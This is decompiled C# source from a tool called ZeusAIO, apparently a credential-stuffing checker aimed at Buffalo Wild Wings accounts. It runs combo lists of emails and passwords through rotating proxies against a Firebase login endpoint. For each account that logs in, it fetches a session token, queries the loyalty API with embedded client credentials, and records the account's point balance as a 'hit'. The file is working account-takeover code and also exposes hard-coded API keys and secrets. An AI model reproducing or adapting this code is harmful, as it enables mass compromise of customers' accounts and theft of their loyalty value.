// Decompiled with JetBrains decompiler
// Type: BwwChecker.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using ZeusAIO;

namespace BwwChecker
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0";
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.AllowAutoRedirect = false;
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              string input = httpRequest.Post("https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyCmtykcZ6UTfD0vvJ05IpUVe94uIaUQdZ4", "{\"email\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\",\"returnSecureToken\":true}", "application/json").ToString();
              if (input.Contains("idToken"))
              {
                string captures = Check.BuffaloWildWingsGetCaptures(Regex.Match(input, "idToken\": \"(.*?)\"").Groups[1].Value);
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - BWW] " + s[0] + ":" + s[1] + " | " + captures, Color.Green);
                Export.AsResult("/Buffalo Wild Wings_hits", s[0] + ":" + s[1] + " | " + captures);
                return false;
              }
              if (input.Contains("invalid"))
                break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    private static string BuffaloWildWingsGetCaptures(string idToken)
    {
      while (true)
      {
        try
        {
          using (HttpRequest httpRequest = new HttpRequest())
          {
            httpRequest.IgnoreProtocolErrors = true;
            httpRequest.ConnectTimeout = 10000;
            httpRequest.KeepAliveTimeout = 10000;
            httpRequest.ReadWriteTimeout = 10000;
            string proxyAddress = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
            if (mainmenu.proxyProtocol == "HTTP")
              httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxyAddress);
            if (mainmenu.proxyProtocol == "SOCKS4")
              httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxyAddress);
            if (mainmenu.proxyProtocol == "SOCKS5")
              httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxyAddress);
            httpRequest.AddHeader("Content-Type", "application/json");
            httpRequest.Authorization = "Bearer " + idToken;
            string input1 = httpRequest.Post(new Uri("https://us-central1-buffalo-united.cloudfunctions.net/getSession"), (HttpContent) new BytesContent(Encoding.Default.GetBytes("{\"data\":{\"version\":\"6.38.44\",\"platform\":\"ios\",\"recaptchaToken\":\"none\"}}"))).ToString();
            if (input1.Contains("\"AccessToken\":\""))
            {
              string str1 = Regex.Match(input1, "\"ProfileId\":\"(.*?)\"").Groups[1].Value;
              string str2 = Regex.Match(input1, "\"AccessToken\":\"(.*?)\"").Groups[1].Value;
              httpRequest.AddHeader("Authorization", "OAuth " + str2);
              httpRequest.AddHeader("X_CLIENT_ID", "4171883342bf4b88aa4b88ec77f5702b");
              httpRequest.AddHeader("X_CLIENT_SECRET", "786c1B856fA542C4b383F3E8Cdd36f3f");
              string input2 = httpRequest.Get(new Uri("https://api.buffalowildwings.com/loyalty/v1/profiles/" + str1 + "/pointBalance?status=A")).ToString();
              if (input2.Contains("PointAmount"))
                return "Point Balance: " + Regex.Match(input2, "\"PointAmount\":(.*?),").Groups[1].Value;
              if (!input2.Contains("403 ERROR"))
                ;
            }
          }
        }
        catch
        {
          ++mainmenu.errors;
        }
      }
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
  }
}
